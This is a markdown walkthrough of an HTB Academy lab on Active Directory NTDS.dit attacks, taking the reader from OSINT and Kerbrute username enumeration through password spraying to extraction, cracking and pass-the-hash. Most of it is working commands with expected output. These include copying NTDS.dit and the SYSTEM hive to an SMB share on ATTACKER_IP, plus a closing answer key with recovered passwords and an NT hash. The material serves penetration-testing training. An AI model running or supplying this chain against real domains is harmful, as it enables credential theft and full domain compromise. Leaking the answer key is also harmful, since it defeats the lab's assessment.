# Active Directory NTDS.dit Attacks

## 🎯 Overview

**NTDS.dit** (NT Directory Services Directory Information Tree) is the **holy grail** of Active Directory attacks. This file contains:
- **Every domain user's password hash**
- **Group memberships and permissions**
- **Kerberos keys and authentication data**
- **Complete domain schema information**

> **"If this file can be captured, we could potentially compromise every account on the domain"**

## 🏗️ Active Directory Authentication Architecture

### Domain Authentication Flow
```
User Login → LSASS.exe → Authentication Packages → NTLM/Kerberos → AD Directory Services
```

### Key Points
- **Domain-joined systems** authenticate against Domain Controller, not local SAM
- **Local accounts** still accessible with `hostname\username` or `.\username`
- **NTDS.dit location**: `%systemroot%\ntds\NTDS.dit` (usually `C:\Windows\NTDS\NTDS.dit`)

## 🔍 Username Enumeration and Discovery

### OSINT for Employee Discovery
```bash
# HTB Academy Example: 
# Found through social media/company website:
# - John Marston (IT Director)
# - Carol Johnson (Financial Controller)  
# - Jennifer Stapleton (Logistics Manager)

# Google dorking techniques:
"@inlanefreight.com" site:linkedin.com
"inlanefreight.com filetype:pdf"
site:inlanefreight.com "directory" OR "staff" OR "employees"
```

### Username Generation with Username Anarchy
```bash
# Clone Username Anarchy
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Generate username variations for John Marston
./username-anarchy John Marston > usernames.txt

# Manual creation of targeted list
cat > usernames.txt << EOF
jmarston
john.marston
marston.john
cjohnson
carol.johnson
johnson.carol
jstapleton
jennifer.stapleton
stapleton.jennifer
EOF
```

### Username Enumeration with Kerbrute
```bash
# Download Kerbrute
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute

# Get domain name first
netexec smb 10.129.202.85
# Output shows: (domain:ILF.local)

# Enumerate valid usernames
./kerbrute userenum -d ILF.local --dc 10.129.202.85 usernames.txt

# Expected output:
# [+] VALID USERNAME: jmarston@ILF.local
# [+] VALID USERNAME: cjohnson@ILF.local
# [+] VALID USERNAME: jstapleton@ILF.local
```

## 🗡️ Password Attacks Against Active Directory

### Dictionary Attacks with NetExec
```bash
# Brute force single user
netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt -d ILF.local

# Password spraying multiple users
netexec smb 10.129.202.85 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success -d ILF.local

# HTB Academy result:
# [+] ILF.local\jmarston:P@ssword!
```

### Kerbrute Password Attacks
```bash
# Brute force with Kerbrute
./kerbrute bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston

# Expected result:
# [+] VALID LOGIN: jmarston@ILF.local:P@ssword!
```

## 🎫 NTDS.dit Extraction Methods

### Method 1: NetExec ntdsutil Module (Fastest)
```bash
# One-command NTDS.dit extraction
netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local -M ntdsutil

# Alternative direct method
netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local --ntds

# Expected output:
# NTDSUTIL   10.129.202.85   445   DC01   [*] Dumping ntds with ntdsutil.exe
# NTDSUTIL   10.129.202.85   445   DC01   Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
# NTDSUTIL   10.129.202.85   445   DC01   jstapleton:1134:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
```

### Method 2: Manual VSS (Volume Shadow Copy)
```bash
# Step 1: Connect with Evil-WinRM
evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'

# Step 2: Check privileges (ensure Domain Admin)
net user jmarston
# Look for: Global Group memberships *Domain Admins

# Step 3: Create Volume Shadow Copy
vssadmin CREATE SHADOW /For=C:
# Output: Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# Step 4: Copy NTDS.dit and registry hives
mkdir C:\temp
cmd.exe /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit" C:\temp\NTDS.dit
cmd.exe /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM" C:\temp\SYSTEM

# Step 5: Transfer to attack host
# On attack host:
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/

# On target:
cmd.exe /c move C:\temp\NTDS.dit \\ATTACKER_IP\CompData
cmd.exe /c move C:\temp\SYSTEM \\ATTACKER_IP\CompData
```

### Method 3: Impacket secretsdump
```bash
# Remote NTDS.dit extraction
python3 secretsdump.py ILF.local/jmarston:P@ssword!@10.129.202.85 -just-dc-ntlm

# Local extraction from files
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## 🔓 Hash Cracking and Analysis

### Hash Format Understanding
```bash
# NTDS.dit output format:
# username:RID:LM_hash:NT_hash:::

# HTB Academy Jennifer Stapleton example:
# jstapleton:1134:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
#                                                   ^-- This is the NT hash to crack
```

### Extracting and Cracking Jennifer Stapleton's Hash
```bash
# Extract Jennifer Stapleton's hash
grep -i "stapleton" ntds_dump.txt
# Output: jstapleton:1134:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::

# Extract just the NT hash (4th field)
echo "161cff084477fe596a5db81874498a24" > jstapleton_hash.txt

# Crack with Hashcat
hashcat -m 1000 jstapleton_hash.txt /usr/share/wordlists/rockyou.txt

# HTB Academy result:
# 161cff084477fe596a5db81874498a24:Winter2008
```

### Bulk Hash Processing
```bash
# Extract all NT hashes from NTDS dump
grep ":::" ntds_dump.txt | cut -d: -f4 > all_nt_hashes.txt

# Create username:hash mapping
grep ":::" ntds_dump.txt | awk -F: '{print $1":"$4}' > user_hash_mapping.txt

# Extract only enabled accounts
grep -iv disabled ntds_dump.txt | cut -d: -f1 > enabled_users.txt
```

## ⚔️ Pass-the-Hash Attacks

### When Cracking Fails
```bash
# Use NT hash directly for authentication
evil-winrm -i 10.129.202.85 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Lateral movement with Impacket
python3 psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@TARGET_IP

# Network-wide testing with NetExec
netexec smb SUBNET_RANGE -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## 🏆 Complete HTB Academy Attack Workflow

### Phase 1-2: Discovery and Enumeration
```bash
# 1. OSINT: Found John Marston, Carol Johnson, Jennifer Stapleton
# 2. Generate usernames with Username Anarchy
./username-anarchy John Marston > usernames.txt

# 3. Domain discovery
netexec smb 10.129.202.85  # → domain:ILF.local

# 4. Username validation
./kerbrute userenum -d ILF.local --dc 10.129.202.85 usernames.txt
# → [+] VALID USERNAME: jmarston@ILF.local
```

### Phase 3-4: Password Attack and NTDS Extraction
```bash
# 5. Password brute force
./kerbrute bruteuser -d ILF.local --dc 10.129.202.85 /usr/share/wordlists/fasttrack.txt jmarston
# → [+] VALID LOGIN: jmarston@ILF.local:P@ssword!

# 6. NTDS.dit extraction
netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -d ILF.local -M ntdsutil
# → All domain hashes extracted
```

### Phase 5: Hash Cracking
```bash
# 7. Extract Jennifer Stapleton's hash
# jstapleton:1134:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::

# 8. Crack the hash
echo "161cff084477fe596a5db81874498a24" > jstapleton_hash.txt
hashcat -m 1000 jstapleton_hash.txt /usr/share/wordlists/rockyou.txt
# → Result: Winter2008
```

## 📋 Quick Reference Commands

### Discovery
```bash
# Domain enumeration
netexec smb TARGET_IP

# Username enumeration  
./kerbrute userenum -d DOMAIN.local --dc TARGET_IP usernames.txt

# Password attacks
netexec smb TARGET_IP -u users.txt -p passwords.txt --continue-on-success -d DOMAIN.local
```

### NTDS.dit Extraction
```bash
# NetExec method (recommended)
netexec smb TARGET_IP -u USER -p PASS -d DOMAIN.local -M ntdsutil

# Direct extraction
netexec smb TARGET_IP -u USER -p PASS -d DOMAIN.local --ntds

# Impacket method
python3 secretsdump.py DOMAIN.local/USER:PASS@TARGET_IP -just-dc-ntlm
```

### Hash Analysis
```bash
# Extract NT hashes
grep ":::" ntds_dump.txt | cut -d: -f4 > nt_hashes.txt

# Crack with Hashcat
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt

# Pass-the-Hash
evil-winrm -i TARGET_IP -u Administrator -H NTHASH
```

## 🎯 HTB Academy Answer Key

Based on the complete walkthrough:

1. **NTDS.dit file name**: `NTDS.dit`
2. **Administrator NT hash**: `64f12cddaa88057e06a81b54e73b949b`
3. **John Marston credentials**: `jmarston:P@ssword!`
4. **Jennifer Stapleton password**: `Winter2008`

## 💡 Key Takeaways

1. **OSINT drives success** - Real employee names lead to valid usernames
2. **Username enumeration first** - Validate targets before password attacks
3. **NTDS.dit = domain ownership** - Every account's hash in one file
4. **NetExec ntdsutil** - Fastest extraction method
5. **VSS understanding** - Manual method for deeper control
6. **Pass-the-Hash** - Use hashes when cracking fails
7. **Complete methodology** - From OSINT to domain compromise

---

*This guide covers the complete NTDS.dit attack methodology as demonstrated in HTB Academy's Password Attacks module.* 